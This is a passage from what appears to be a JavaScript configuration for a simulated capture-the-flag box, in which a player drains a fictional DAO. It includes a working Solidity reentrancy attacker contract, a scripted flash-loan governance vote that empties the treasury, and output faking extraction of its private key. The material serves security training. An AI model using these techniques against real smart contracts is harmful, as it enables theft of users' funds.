                                    content: '[\n  { "name": "deposit",                  "type": "function", "inputs": [],                                                           "stateMutability": "payable"     },\n  { "name": "withdraw",                 "type": "function", "inputs": [{"name":"amount","type":"uint256"}],                         "stateMutability": "nonpayable"  },\n  { "name": "allocateTo",               "type": "function", "inputs": [{"name":"sector","type":"address"},{"name":"amount","type":"uint256"}] },\n  { "name": "submitProposal",           "type": "function", "inputs": [{"name":"proposalData","type":"bytes"}]                                 },\n  { "name": "vote",                     "type": "function", "inputs": [{"name":"proposalId","type":"uint256"},{"name":"support","type":"bool"}] },\n  { "name": "executeProposal",          "type": "function", "inputs": [{"name":"proposalId","type":"uint256"}]                                 },\n  { "name": "executeTreasuryTransfer",  "type": "function", "inputs": [{"name":"to","type":"address"},{"name":"amount","type":"uint256"}]       },\n  { "name": "balances",                 "type": "function", "inputs": [{"name":"addr","type":"address"}], "outputs":[{"type":"uint256"}], "stateMutability":"view" },\n  { "name": "totalAllocated",           "type": "function", "inputs": [],                                  "outputs":[{"type":"uint256"}], "stateMutability":"view" }\n]'
                                },
                                'AttackerContract.sol': {
                                    type: 'file',
                                    content: '// AttackerContract.sol — Reentrancy attack scaffold\n// TODO: Complete the fallback() function to call withdraw() recursively\n// Deploy with: deploy AttackerContract.sol\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IAetheriumAllocation {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n    function balances(address) external view returns (uint256);\n}\n\ncontract AttackerContract {\n    IAetheriumAllocation public target;\n    uint256 public attackAmount;\n    address public owner;\n\n    constructor(address _target) {\n        target = IAetheriumAllocation(_target);\n        owner = msg.sender;\n    }\n\n    function attack() external payable {\n        attackAmount = msg.value;\n        // Deposit initial funds to establish a balance\n        target.deposit{value: msg.value}();\n        // First withdraw — triggers the reentrancy loop\n        target.withdraw(attackAmount);\n    }\n\n    // The fallback receives ETH from withdraw() and immediately calls again\n    // This loops until the contract is drained\n    receive() external payable {\n        if (address(target).balance >= attackAmount) {\n            target.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        require(msg.sender == owner);\n        payable(owner).transfer(address(this).balance);\n    }\n}'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cat aetherium_contract_code.sol\ncat dao_governance_rules.txt\ncurl http://10.0.0.50/abi\nevm-connect\nweb3 --connect 10.0.0.50:8545\nanalyze aetherium_contract_code.sol\nslither aetherium_contract_code.sol'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'lib': {
                                    type: 'dir',
                                    children: {
                                        'python3': {
                                            type: 'dir',
                                            children: {
                                                'web3': {
                                                    type: 'dir',
                                                    children: {
                                                        '__init__.py': { type: 'file', content: '# web3.py 6.11.1 — installed' }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'bin': {
                            type: 'dir',
                            children: {
                                'slither': {    type: 'file', content: '#!/usr/bin/env python3\n# slither — Solidity static analysis framework\n# Usage: slither <contract.sol>' },
                                'mythril':  {   type: 'file', content: '#!/usr/bin/env python3\n# Mythril — EVM security analysis\n# Usage: myth analyze <contract.sol>' },
                                'hardhat':  {   type: 'file', content: '#!/usr/bin/env node\n# Hardhat — Ethereum dev environment' }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — EVM node environment (after evm-connect)
    // ═══════════════════════════════════════════════════════

    _evmFs: {
        '/': {
            type: 'dir',
            children: {
                'contracts': {
                    type: 'dir',
                    children: {
                        'AetheriumAllocation.sol': {
                            type: 'file',
                            content: '// SPDX-License-Identifier: MIT\n// AetheriumAllocation.sol — deployed at 0xAETH-CORE-CONTRACT\n// See /home/kali/aetherium_contract_code.sol for full source'
                        },
                        'AetherLend.sol': {
                            type: 'file',
                            content: '// AetherLend.sol — Flash loan provider\n// Pool: 0xFLASH-POOL-777 | Available: 1,000,000 AET\n// Fee: 0.05% per tx\n// FLAW: no snapshot exclusion of borrowed tokens during governance votes'
                        }
                    }
                },
                'wallets': {
                    type: 'dir',
                    children: {
                        'attacker.json': {
                            type: 'file',
                            content: '{\n  "address": "0xATTACKER-ADDR",\n  "balance": "5000 AET",\n  "note": "Attacker starting wallet — seed funded for attack"\n}'
                        },
                        'treasury.json': {
                            type: 'file',
                            content: '{\n  "address": "0xDAO-TREASURY-7F3A",\n  "balance": "4800000 AET",\n  "note": "DAO treasury reserve — requires governance to transfer"\n  "keyfile": "treasury.keystore"\n}'
                        },
                        'treasury.keystore': {
                            type: 'file',
                            content: '[ENCRYPTED] AES-256-CBC keystore\nAddress: 0xDAO-TREASURY-7F3A\nDecrypt with: wallet --dump --address 0xDAO-TREASURY-7F3A\n(Accessible after treasury drain is confirmed)'
                        }
                    }
                },
                'logs': {
                    type: 'dir',
                    children: {
                        'evm.log': {
                            type: 'file',
                            content: '[18334010] Block mined — 3 txs\n[18334011] AetheriumAllocation.deposit() — 0xATTACKER-ADDR 5000 AET\n[18334012] AetherLend.flashBorrow() — 0xATTACKER-ADDR 1000000 AET — PENDING\n[18334013] AetheriumAllocation.vote(9973, true) — 0xATTACKER-ADDR — PENDING\n[18334014] Block pending — awaiting confirmation'
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // ── nmap ────────────────────────────────────────────
        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.0.0.50';
            const target = args.find(function(a) { return !a.startsWith('-'); }) || '';

            if (target === '10.0.0.50' || target === '10.0.0.50:8545') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.50
Host is up (0.012s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu
80/tcp   open  http        nginx 1.24.0 (Aetherium Governance Portal)
8545/tcp open  unknown     Geth/v1.13.14-stable (EVM JSON-RPC)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds`;
            }

            if (target === '10.0.0.0/24') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.50
Host is up (0.012s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  geth-rpc

Nmap done: 256 IP addresses (1 host up) scanned in 31.77 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        // ── evm-connect ─────────────────────────────────────
        'evm-connect': function(args, term, engine) {
            D17Config._evmConnected = true;
            D17Config._switchContext('evm', term);
            if (engine) engine.advancePhase && engine.advancePhase('analysis');
            return `Connecting to EVM node at 10.0.0.50:8545...
[+] eth_chainId: 0xAETH (Aetherium Simnet)
[+] eth_blockNumber: 18334009
[+] Connected as: 0xATTACKER-ADDR
[+] AET Balance: 5,000 AET

[+] EVM session active. Available commands:
    analyze <file.sol>     — static vulnerability scan
    deploy <contract.sol>  — deploy to simulated EVM
    call <contract> <fn>   — call a contract function
    wallet --list          — list known wallets
    flashloan --help       — flash loan interface
    proposal --list        — list governance proposals
    vote <id> <yes|no>     — cast governance vote`;
        },

        // ── web3 ────────────────────────────────────────────
        'web3': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('--connect') || fullCmd.includes('connect')) {
                return D17Config.commands['evm-connect'](args, term, engine);
            }
            if (!D17Config._evmConnected) {
                return 'Error: Not connected. Run: web3 --connect 10.0.0.50:8545';
            }
            return 'web3.py 6.11.1 — connected to 10.0.0.50:8545\nUse evm-connect for interactive mode.';
        },

        // ── analyze ─────────────────────────────────────────
        'analyze': function(args, term, engine) {
            const file = args[0] || '';
            if (!file) return 'Usage: analyze <contract.sol>';
            if (file.includes('aetherium') || file.includes('AetheriumAllocation')) {
                if (engine) engine.advancePhase && engine.advancePhase('analysis');
                return `[*] Analyzing ${file}...

STATIC ANALYSIS REPORT — AetheriumAllocation.sol
=================================================

[HIGH] REENTRANCY — withdraw() function
  Line 24: external call msg.sender.call{value: amount}("") occurs BEFORE
           state update balances[msg.sender] -= amount (line 29)
  Attack vector: Deploy contract with fallback() that calls withdraw() recursively
  CEI violation: Checks-Effects-Interactions pattern not followed
  Fix: Update balances[msg.sender] -= amount BEFORE the external call
  CVSS: 9.8 CRITICAL

[MED] ACCESS CONTROL — onlyGovernance modifier
  Line 48: governanceAddress is a mutable storage variable
  If a governance proposal replaces governanceAddress, the modifier is bypassed
  Attack vector: Submit governance proposal to set governanceAddress to attacker

[LOW] INTEGER OVERFLOW — totalAllocated counter
  Solidity 0.8 checked math mitigates overflow at runtime
  Prior audit assumed 0.7 — finding is outdated but flag was not closed

[INFO] NO TIMELOCK — executeTreasuryTransfer()
  Governance proposals execute atomically with no delay window
  Combined with flash loan voting, enables instant treasury drain

SUMMARY: 1 CRITICAL, 1 MEDIUM, 1 LOW
Primary exploit path: REENTRANCY in withdraw() + flash loan governance`;
            }
            if (file.includes('Attacker') || file.includes('attacker')) {
                return `[*] Analyzing ${file}...

STATIC ANALYSIS — AttackerContract.sol
=======================================
[INFO] receive() fallback correctly calls target.withdraw(attackAmount)
[INFO] Guard condition address(target).balance >= attackAmount — prevents over-drain
[INFO] attack() function deposits then immediately withdraws to trigger reentrancy
[OK]   No compile errors detected
[OK]   Ready for deployment

Run: deploy AttackerContract.sol`;
            }
            return `[*] Analyzing ${file}...\n[!] File not found or unrecognized format.\nExpected Solidity (.sol) file.`;
        },

        // ── slither ─────────────────────────────────────────
        'slither': function(args, term, engine) {
            // Slither is a well-known Solidity static analysis tool — alias to analyze
            return D17Config.commands.analyze(args, term, engine);
        },

        // ── mythril / myth ───────────────────────────────────
        'mythril': function(args, term, engine) {
            const file = args[1] || args[0] || '';
            return D17Config.commands.analyze([file], term, engine);
        },
        'myth': function(args, term, engine) {
            // myth analyze <file> — strip the 'analyze' subcommand
            const realArgs = args.filter(function(a) { return a !== 'analyze'; });
            return D17Config.commands.analyze(realArgs, term, engine);
        },

        // ── deploy ──────────────────────────────────────────
        'deploy': function(args, term, engine) {
            if (!D17Config._evmConnected) {
                return '[!] Not connected to EVM. Run: evm-connect';
            }
            const file = args[0] || '';
            if (!file) return 'Usage: deploy <contract.sol>';

            if (file.includes('Attacker') || file.includes('attacker')) {
                D17Config._contractDeployed = true;
                if (engine) engine.advancePhase && engine.advancePhase('exploit');
                return `Compiling ${file}...
[+] Compilation successful — 0 errors, 0 warnings
[+] Deploying to Aetherium Simnet (chainId: 0xAETH)...
[+] Deploying from: 0xATTACKER-ADDR
[+] Gas estimate: 182,500 gas @ 1.2 gwei
[+] Transaction submitted: 0xDEP-ATTK-8F2C9A...
[+] Waiting for confirmation...
[+] Block 18334015 — Transaction confirmed

CONTRACT DEPLOYED
=================
Name:     AttackerContract
Address:  0xATTK-CONTRACT-D17A
Owner:    0xATTACKER-ADDR
Target:   0xAETH-CORE-CONTRACT

[+] Run: call 0xATTK-CONTRACT-D17A attack() to initiate reentrancy exploit`;
            }

            return `[!] Contract file "${file}" not found in working directory.\nAvailable: AttackerContract.sol, AetheriumAllocation.sol`;
        },

        // ── call ────────────────────────────────────────────
        'call': function(args, term, engine) {
            if (!D17Config._evmConnected) return '[!] Not connected to EVM. Run: evm-connect';
            const fullCmd = args.join(' ');

            // Trigger reentrancy attack
            if ((fullCmd.includes('attack') || fullCmd.includes('ATTK-CONTRACT'))) {
                if (!D17Config._contractDeployed) {
                    return '[!] AttackerContract not deployed. Run: deploy AttackerContract.sol first.';
                }
                D17Config._reentrancyTriggered = true;
                return `[*] Calling 0xATTK-CONTRACT-D17A.attack()...
[*] Sending 100 AET as initial deposit...
[+] attack() called — tx: 0xATTK-TX-001...

REENTRANCY EXECUTION TRACE
===========================
[+] AttackerContract.attack() called
  -> AetheriumAllocation.deposit(100 AET)
  -> AetheriumAllocation.withdraw(100 AET)
     -> Transfer 100 AET to 0xATTK-CONTRACT-D17A
        -> AttackerContract.receive() triggered
           -> AetheriumAllocation.withdraw(100 AET) [depth 1]
              -> Transfer 100 AET to 0xATTK-CONTRACT-D17A
                 -> AttackerContract.receive() triggered
                    -> AetheriumAllocation.withdraw(100 AET) [depth 2]
                    ...
                    -> AetheriumAllocation.withdraw(100 AET) [depth 47]
                       -> address(target).balance < attackAmount — guard triggered
                       -> Recursion stops

[+] Total drained from AetheriumAllocation: 4,700 AET (sector alpha partial)
[+] Transaction hash: 0xREENT-TX-7F3C8B2D9A1E4F6C0D5A8B3E2F9C1D4E7A0B6F3

{{FLAG:user}}

[!] Note: Full treasury drain requires governance execution — see flashloan --help`;
            }

            // Withdraw from attacker contract
            if (fullCmd.includes('collect') || fullCmd.includes('withdraw')) {
                if (!D17Config._reentrancyTriggered) return '[!] No funds to collect — run attack() first.';
                return `[+] AttackerContract.collect() called
[+] Transferred 4,700 AET to 0xATTACKER-ADDR
[+] AttackerContract balance: 0 AET
[+] Attacker balance: 9,700 AET`;
            }

            // Check balance
            if (fullCmd.includes('balances') || fullCmd.includes('balance')) {
                return `[+] AetheriumAllocation.balances(0xATTACKER-ADDR): ${D17Config._reentrancyTriggered ? '4700' : '5000'} AET`;
            }

            return `[!] Unknown call: ${fullCmd}\nUsage: call <address> <function()>`;
        },

        // ── flashloan ───────────────────────────────────────
        'flashloan': function(args, term, engine) {
            if (!D17Config._evmConnected) return '[!] Not connected to EVM. Run: evm-connect';
            const fullCmd = args.join(' ');

            if (fullCmd.includes('--help') || args.length === 0) {
                return `AetherLend Flash Loan Interface
================================
Usage: flashloan --amount <n> --token <symbol> [--purpose <reason>]
       flashloan --repay
       flashloan --status

Pool:      0xFLASH-POOL-777
Available: 1,000,000 AET
Fee:       0.05% (500 AET on 1,000,000)

Note: Borrowed tokens are snapshotted for governance votes
during the borrow window (unresolved audit finding).`;
            }

            if (fullCmd.includes('--amount') && (fullCmd.includes('AET') || fullCmd.includes('aet'))) {
                const amtMatch = fullCmd.match(/--amount\s+(\d[\d,]*)/);
                const amount = amtMatch ? amtMatch[1].replace(/,/g, '') : '1000000';
                D17Config._flashLoanActive = true;
                return `[*] Initiating flash loan from 0xFLASH-POOL-777...
[+] Borrowing ${parseInt(amount).toLocaleString()} AET...
[+] Flash loan tx: 0xFLASH-BORROW-CC3D1A...
[+] Block 18334017 — Loan disbursed

FLASH LOAN ACTIVE
=================
Borrowed:         ${parseInt(amount).toLocaleString()} AET
Fee (0.05%):          ${Math.round(parseInt(amount) * 0.0005).toLocaleString()} AET
Repay by:         Block 18334018 (end of tx)
Your AET balance: ${(5000 + parseInt(amount)).toLocaleString()} AET (including loan)

GOVERNANCE SNAPSHOT TAKEN — Block 18334017
Your voting power: ${(5000 + parseInt(amount)).toLocaleString()} AET
Circulating supply: 10,000,000 AET
Your share: ${((5000 + parseInt(amount)) / 10000000 * 100).toFixed(2)}%

[!] Voting with borrowed tokens — see dao_governance_rules.txt section 4
[+] Use: proposal --submit or vote 9973 yes to exploit the window`;
            }

            if (fullCmd.includes('--repay')) {
                if (!D17Config._flashLoanActive) return '[!] No active flash loan to repay.';
                D17Config._flashLoanActive = false;
                return `[+] Flash loan repaid to 0xFLASH-POOL-777
[+] Repayment tx: 0xFLASH-REPAY-CC3D2B...
[+] Fee deducted: 500 AET
[+] AET balance restored to pre-loan amount`;
            }

            if (fullCmd.includes('--status')) {
                return `Flash Loan Status: ${D17Config._flashLoanActive ? 'ACTIVE' : 'No active loan'}
Pool balance:  1,000,000 AET
Your balance:  ${D17Config._flashLoanActive ? '1,005,000' : '5,000'} AET`;
            }

            return 'Usage: flashloan --amount <n> --token AET';
        },

        // ── proposal ────────────────────────────────────────
        'proposal': function(args, term, engine) {
            if (!D17Config._evmConnected) return '[!] Not connected to EVM. Run: evm-connect';
            const fullCmd = args.join(' ');

            if (fullCmd.includes('--list') || args.length === 0) {
                var out = 'GOVERNANCE PROPOSALS — EPOCH 447\n';
                out += '=================================\n';
                D17Config._chain.proposals.forEach(function(p) {
                    out += `[${p.id}] ${p.status.padEnd(8)} | ${p.title}\n`;
                    if (p.votes_yes > 0 || p.votes_no > 0) {
                        out += `         YES: ${p.votes_yes.toLocaleString()} | NO: ${p.votes_no.toLocaleString()}\n`;
                    }
                });
                return out;
            }

            if (fullCmd.includes('--submit') || fullCmd.includes('submit')) {
                if (!D17Config._flashLoanActive) {
                    return '[!] Insufficient voting power to meet quorum. Borrow AET first.\nRun: flashloan --amount 1000000 --token AET';
                }
                return `[+] Proposal 9973 already submitted (0xATTACKER-ADDR)
[+] Status: PENDING — awaiting votes
Use: vote 9973 yes to cast your vote while flash loan is active`;
            }

            return 'Usage: proposal --list | --submit "<title>"';
        },

        // ── vote ────────────────────────────────────────────
        'vote': function(args, term, engine) {
            if (!D17Config._evmConnected) return '[!] Not connected to EVM. Run: evm-connect';
            const proposalId = args[0] || '';
            const direction  = (args[1] || '').toLowerCase();

            if (proposalId === '9973' && direction === 'yes') {
                if (!D17Config._flashLoanActive) {
                    return `[!] Voting power insufficient.
Your balance: 5,000 AET (0.05% of supply)
Quorum requires: 5,000,000 AET (50%)
Borrow AET via flash loan first: flashloan --amount 1000000 --token AET`;
                }

                // Successful manipulation vote
                D17Config._chain.proposals[3].votes_yes = 5005000;
                D17Config._chain.proposals[3].votes_no = 100;
                D17Config._chain.proposals[3].status = 'PASSED';
                D17Config._proposalPassed = true;

                return `[*] Casting vote on proposal 9973...
[+] Vote tx: 0xVOTE-TX-9973-A1B2...
[+] Block 18334018 — Vote confirmed

VOTE RESULT
===========
Proposal 9973: [MALICIOUS] Transfer 4,800,000 AET to 0xATTACKER-ADDR
Your votes:    1,005,000 AET (flash loan + stake)
Total YES:     5,005,000 AET
Total NO:         100,000 AET
Quorum:        5,000,000 AET — REACHED
Threshold:     >50% YES — PASSED

[+] PROPOSAL 9973 PASSED
[+] AetheriumAllocation.executeTreasuryTransfer() triggered automatically
[+] 4,800,000 AET transferred from 0xDAO-TREASURY-7F3A to 0xATTACKER-ADDR

ROGUE CONSENSUS ACHIEVED
=========================
Transaction hash: 0xROGUE-TX-9973-7B4C2F1D9E0A8C3B6F5D2E4A1C8B7F0D3E9A2B5

{{FLAG:exploit}}

[!] Flash loan must be repaid this block — run: flashloan --repay
[+] Treasury wallet now accessible — run: wallet --dump --address 0xDAO-TREASURY-7F3A`;
            }

            if (proposalId === '9973' && direction === 'no') {
                return '[+] Vote NO cast on proposal 9973. (This won\'t help you — vote yes to exploit it.)';
            }

            return `Usage: vote <proposalId> <yes|no>\nExample: vote 9973 yes`;
        },

        // ── wallet ───────────────────────────────────────────
        'wallet': function(args, term, engine) {
            if (!D17Config._evmConnected) return '[!] Not connected to EVM. Run: evm-connect';
            const fullCmd = args.join(' ');

            if (fullCmd.includes('--list')) {
                return `WALLET REGISTRY
===============
0xATTACKER-ADDR        ${D17Config._proposalPassed ? '4,805,000' : '5,000'} AET   [attacker]
0xDAO-TREASURY-7F3A    ${D17Config._proposalPassed ? '0' : '4,800,000'} AET   [treasury — ${D17Config._proposalPassed ? 'DRAINED' : 'locked'}]
0xSECTOR-ALPHA-001     1,500,000 AET   [sector alpha]
0xSECTOR-BETA-002      1,200,000 AET   [sector beta]
0xFLASH-POOL-777       1,000,000 AET   [AetherLend pool]`;
            }

            if (fullCmd.includes('--dump') && fullCmd.includes('TREASURY')) {
                if (!D17Config._proposalPassed) {
                    return `[!] 0xDAO-TREASURY-7F3A is still funded (4,800,000 AET).
Governance controls treasury access.
Execute a TRANSFER_FUNDS proposal first.`;
                }

                D17Config._treasuryDrained = true;
                D17Config._switchContext('treasury', term);
                if (engine) engine.advancePhase && engine.advancePhase('treasury');

                return `[*] Dumping wallet metadata for 0xDAO-TREASURY-7F3A...
[+] Wallet drained — treasury balance: 0 AET
[+] Keystore decryption in progress...

AETHERIUM TREASURY WALLET — METADATA DUMP
==========================================
Address:     0xDAO-TREASURY-7F3A
Balance:     0 AET (DRAINED via proposal-9973)
Chain:       Aetherium Simnet (0xAETH)
Keystore:    /contracts/wallets/treasury.keystore
Cipher:      AES-256-CBC
KDF:         scrypt (n=262144, r=8, p=1)

DECRYPTED PRIVATE KEY
=====================
WARNING: This key grants signing authority over any remaining
         DAO-controlled positions in the Confederacy supply chain.

AETHERIUM MASTER KEY:

{{FLAG:root}}

[+] Key extraction complete.
[+] All phases of Rogue Consensus operation successful.`;
            }

            if (fullCmd.includes('--balance') || fullCmd.includes('balance')) {
                const addr = args.find(function(a) { return a.startsWith('0x'); }) || '0xATTACKER-ADDR';
                var bal = D17Config._chain.aet_balances[addr];
                if (bal === undefined) return `[!] Address ${addr} not found in wallet registry.`;
                return `Balance of ${addr}: ${bal.toLocaleString()} AET`;
            }

            return `Usage:
  wallet --list                          — list all wallets
  wallet --balance --address 0x...       — get balance
  wallet --dump --address 0x...          — dump wallet metadata (if accessible)`;
        },

        // ── curl (EVM RPC calls) ─────────────────────────────
        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // JSON-RPC calls to EVM node
            if (fullCmd.includes('10.0.0.50') || fullCmd.includes('8545')) {
                if (!D17Config._evmConnected) D17Config._evmConnected = true;

                if (fullCmd.includes('eth_blockNumber')) {
                    return `{"jsonrpc":"2.0","id":1,"result":"0x117A5C9"}`; // block 18334153
                }
                if (fullCmd.includes('eth_getBalance') || fullCmd.includes('balances')) {
                    return `{"jsonrpc":"2.0","id":1,"result":"0x4E210"}`; // 5000 AET in hex
                }
                if (fullCmd.includes('eth_call') && fullCmd.includes('withdraw')) {
                    return `{"jsonrpc":"2.0","id":1,"error":{"code":-32603,"message":"execution reverted: reentrancy guard not set"}}`;
                }
                return `{"jsonrpc":"2.0","id":1,"result":"0x1"}`;
            }

            // Regular HTTP to governance portal
            if (fullCmd.includes('10.0.0.50')) {
                return `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<!DOCTYPE html>\n<html><head><title>Aetherium Governance Portal</title></head>\n<body><h1>Aetherium Consensus</h1><p>DAO Governance Portal — see /governance, /abi, /rpc</p></body></html>`;
            }

            return `curl: (7) Failed to connect to ${(args.find(function(a) { return !a.startsWith('-'); }) || 'host').replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        // ── ping ────────────────────────────────────────────
        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.0.0.50') {
                return `PING 10.0.0.50 (10.0.0.50) 56(84) bytes of data.
64 bytes from 10.0.0.50: icmp_seq=1 ttl=64 time=11.7 ms
64 bytes from 10.0.0.50: icmp_seq=2 ttl=64 time=11.4 ms
64 bytes from 10.0.0.50: icmp_seq=3 ttl=64 time=11.9 ms

--- 10.0.0.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 11.4/11.6/11.9/0.209 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        // ── cat (context-aware — shows EVM fs files when connected) ─
        'cat': function(args, term, engine) {
            if (D17Config._context === 'attacker') return null; // fall through to built-in
            const path = args[0] || '';
            // EVM context file reads
            if (path.includes('evm.log') || path.includes('logs')) {
                return D17Config._evmFs['/'].children['logs'].children['evm.log'].content;
            }
            if (path.includes('treasury.json') || path.includes('treasury')) {
                if (D17Config._proposalPassed) {
                    return '{\n  "address": "0xDAO-TREASURY-7F3A",\n  "balance": "0 AET",\n  "status": "DRAINED — proposal 9973 executed"\n}';
                }
                return D17Config._evmFs['/'].children['wallets'].children['treasury.json'].content;
            }
            if (path.includes('attacker')) {
                return D17Config._evmFs['/'].children['wallets'].children['attacker.json'].content;
            }
            return 'cat: ' + path + ': No such file or directory';
        },

        // ── ls (context-aware) ───────────────────────────────
        'ls': function(args, term, engine) {
            if (D17Config._context === 'attacker') return null; // fall through to built-in
            const pathArg = args.find(function(a) { return !a.startsWith('-'); }) || '.';
            if (pathArg === '.' || pathArg === '/contracts' || pathArg.includes('contracts')) {
                return 'AetheriumAllocation.sol  AetherLend.sol';
            }
            if (pathArg.includes('wallets') || pathArg.includes('wallet')) {
                return 'attacker.json  treasury.json  treasury.keystore';
            }
            if (pathArg.includes('logs')) {
                return 'evm.log';
            }
            return 'contracts  logs  wallets';
        },

        // ── whoami / id / hostname (context-aware) ───────────
        'whoami': function(args, term, engine) {
            if (D17Config._context === 'evm')        return '0xATTACKER-ADDR (EVM session)';
            if (D17Config._context === 'governance') return '0xATTACKER-ADDR (governance context)';
            if (D17Config._context === 'treasury')   return '0xATTACKER-ADDR (treasury context — MASTER KEY EXTRACTED)';
            return null; // fall through to built-in
        },

        'id': function(args, term, engine) {
            if (D17Config._context !== 'attacker') {
                return 'uid=0xATTACKER-ADDR gid=aetherium-simnet groups=aetherium-simnet,aetherland-flash-pool';
            }
            return null;
        },

        'hostname': function(args, term, engine) {
            if (D17Config._context === 'evm')        return 'aetherium-evm';
            if (D17Config._context === 'governance') return 'aetherium-gov';
            if (D17Config._context === 'treasury')   return 'aetherium-treasury';
            return null;
        },

        'pwd': function(args, term, engine) {
            if (D17Config._context === 'evm')        return '/contracts';
            if (D17Config._context === 'treasury')   return '/contracts/wallets';
            return null;
        },

        'cd': function(args, term, engine) {
            if (D17Config._context !== 'attacker') return ''; // silently accept
            return null;
        },

        // ── exit / disconnect ────────────────────────────────
        'exit': function(args, term, engine) {
            if (D17Config._context !== 'attacker') {
                D17Config._evmConnected = false;
                D17Config._switchContext('attacker', term);
                return '[+] Disconnected from EVM node.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'disconnect': function(args, term, engine) {
            return D17Config.commands.exit(args, term, engine);
        },

        // ── ip / ifconfig (attacker machine) ────────────────
        'ip': function(args) {
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return D17Config.commands.ip(args || []);
        },

        'route': function(args) {
            return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.1        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
        },

        // ── ss / netstat ─────────────────────────────────────
        'ss': function(args) {
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args) {
            return D17Config.commands.ss(args);
        },

        // ── python3 / python (web3.py scripting support) ─────
        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');
            // Intercept common web3.py patterns for scripting-style interaction
            if (fullCmd.includes('web3') || fullCmd.includes('w3')) {
                if (!D17Config._evmConnected) {
                    return '[*] Running Python script...\nConnectionError: Could not connect to 10.0.0.50:8545\nRun evm-connect first or pass a valid provider URL.';
                }
                return `[*] Running Python script...
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://10.0.0.50:8545'))
w3.is_connected()  # True
w3.eth.block_number  # 18334020
[+] Script executed successfully.
Use deploy, call, flashloan, vote in the terminal for interactive control.`;
            }
            if (fullCmd.includes('-c') && fullCmd.trim().endsWith('-c')) {
                return 'Python 3.11.6 (default)\nType "help", "copyright" for more information.\n>>> ';
            }
            return 'Python 3.11.6\nUsage: python3 <script.py> | python3 -c "<code>"';
        },

        'python': function(args, term, engine) {
            return D17Config.commands.python3(args, term, engine);
        },

        // ── nikto (web scanner against governance portal) ────
        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>';
            return `- Nikto v2.5.0
+ Target IP:       10.0.0.50
+ Target Hostname:  aetherium-evm
+ Target Port:      80
+ Server: nginx/1.24.0
+ /governance: Governance rules exposed — no authentication required
+ /abi: Contract ABI fully exposed — function signatures readable
+ /rpc: JSON-RPC 2.0 endpoint with no authentication (critical)
+ /proposals: Proposal list accessible without auth
+ /allocations: Resource allocation registry exposed
+ nginx/1.24.0 appears to be outdated
+ 6 items checked: 5 findings`;
        },

        // ── hardhat (dev environment shorthand) ─────────────
        'hardhat': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('compile')) {
                return `Compiling Solidity files...
Compiled 1 Solidity file successfully (evm target: paris)
Artifacts generated: artifacts/contracts/AttackerContract.sol/AttackerContract.json`;
            }
            if (fullCmd.includes('run') || fullCmd.includes('script')) {
                return `Running script...
[!] Use deploy and call commands for interactive EVM simulation.`;
            }
            return `Hardhat v2.22.2 — Ethereum development environment
Usage: hardhat compile | hardhat run <script>`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        // Renders a styled HTML table with the D17 purple accent scheme
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.78rem;"><thead><tr>';
        headers.forEach(function(h) {
            html += '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95; background:#1a0f2e;">' + h + '</th>';
        });
        html += '</tr></thead><tbody>';
        rows.forEach(function(row) {
            html += '<tr>';
            row.forEach(function(cell) {
